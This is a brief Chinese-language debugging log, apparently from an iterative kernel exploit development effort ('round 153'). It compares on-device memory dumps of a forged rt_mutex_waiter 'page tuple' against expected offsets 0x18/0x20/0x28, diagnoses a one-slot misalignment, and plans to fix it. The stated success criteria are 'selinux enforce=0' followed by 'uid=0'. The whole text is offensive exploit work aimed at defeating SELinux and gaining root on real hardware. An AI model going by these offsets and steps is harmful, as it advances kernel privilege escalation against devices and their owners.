# 43499 · 字节级比对命中：页面元组**错位**（round 153）★

## 真机逐字（三次一致 ✓）

```
main: page tuple w+18=0xffff800000010100  w+20=0x0  w+28=0xffffff802adaad88
      expect  pc=0xffffff802adaad80  right=0xffff800000010100  left=0x0

w+18 : 实际 0xffff800000010100  ✗（应为 pc = 0xffffff802adaad80）
w+20 : 实际 0x0                 ✗（应为 right = 0xffff800000010100）
w+28 : 实际 0xffffff802adaad88  ✗（应为 left = 0x0）
⇒ 三者是**错位**的：w+18 的值属于 w+20 ✓；w+28 的值属于 w+18 ✓ ⇒ 整体**偏移不对** ✗
```

## 期望值从哪来（都是有据的 ✓）

```
退役 payload_builder.cpp:41-44（encode_compact_waiter）：
   waiter+0x18 ← layout.parent
   waiter+0x20 ← layout.right
   waiter+0x28 ← layout.left
本树 write_layout.cpp：parent = target − pointer_bytes ✓；value(=right) = page_value ✓；left = 0 ✓
```

## 为什么这解释了"处处对齐却不写入"

1. 内核只认它自己 `rt_mutex_waiter` 的偏移（即退役那三个 ✓）；
2. 本树的页面把值放在**别的偏移**上 ✗ ⇒ 内核看到的`waiter` 形状里 `right` 为空、`parent` 是别的 ✓；
3. ⇒ 走查要么找不到假对象 ✗，要么找到"形状不合"的 ⇒ 不写 ✓（与实测 `enforce=1` ✗ 完全一致 ✓）。

## 下一步（定位本树页面写入偏移的来源 ✓）

- 看 `PageInputs.waiter`（struct 字段 ✓）的值从哪来、代表什么偏移 ✓；
- 把它对齐到退役的 0x18/0x20/0x28（= 内核 `rt_mutex_waiter` 的 pi_tree/node 偏移 ✓）；
- 判据（直读 ✓）：`main: selinux enforce=0` ✓；随后 `uid=0` ✓。
